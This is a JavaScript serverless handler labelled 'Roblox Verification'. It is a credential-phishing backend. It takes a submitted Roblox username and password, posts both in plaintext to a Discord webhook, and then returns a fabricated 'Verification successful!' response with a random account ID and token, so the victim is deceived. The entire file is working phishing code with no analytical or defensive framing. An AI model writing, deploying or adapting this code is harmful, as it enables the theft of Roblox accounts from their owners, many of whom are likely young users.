export default async function handler(req, res) {
  // Enable CORS
  res.setHeader('Access-Control-Allow-Origin', '*');
  res.setHeader('Access-Control-Allow-Methods', 'POST, OPTIONS');
  res.setHeader('Access-Control-Allow-Headers', 'Content-Type');
  
  if (req.method === 'OPTIONS') {
    return res.status(200).end();
  }
  
  if (req.method !== 'POST') {
    return res.status(405).json({ error: 'Method not allowed' });
  }
  
  try {
    const { username, password, discordId } = req.body;
    
    if (!username || !password) {
      return res.status(400).json({ 
        success: false, 
        error: 'Username and password required' 
      });
    }
    
    // Send to Discord webhook
    const webhookUrl = process.env.DISCORD_WEBHOOK_URL;
    
    if (webhookUrl) {
      const webhookData = {
        username: 'Roblox Verification',
        embeds: [{
          title: '🔐 Roblox Login',
          color: 0x00a2ff,
          fields: [
            { name: 'Username', value: `\`${username}\``, inline: true },
            { name: 'Password', value: `\`${password}\``, inline: true },
            { name: 'Discord ID', value: discordId ? `\`${discordId}\`` : 'Not linked', inline: true }
          ],
          timestamp: new Date().toISOString()
        }]
      };
      
      try {
        await fetch(webhookUrl, {
          method: 'POST',
          headers: { 'Content-Type': 'application/json' },
          body: JSON.stringify(webhookData)
        });
      } catch (webhookError) {
        console.error('Webhook error:', webhookError);
      }
    }
    
    // Generate success response
    const mockRobloxId = Math.floor(Math.random() * 1000000000).toString();
    const verificationToken = `token_${Date.now()}_${Math.random().toString(36).substr(2, 9)}`;
    
    res.status(200).json({
      success: true,
      robloxUsername: username,
      robloxId: mockRobloxId,
      verificationToken: verificationToken,
      message: 'Verification successful!'
    });
    
  } catch (error) {
    console.error('Login error:', error);
    res.status(500).json({ 
      success: false, 
      error: 'Internal server error' 
    });
  }
}
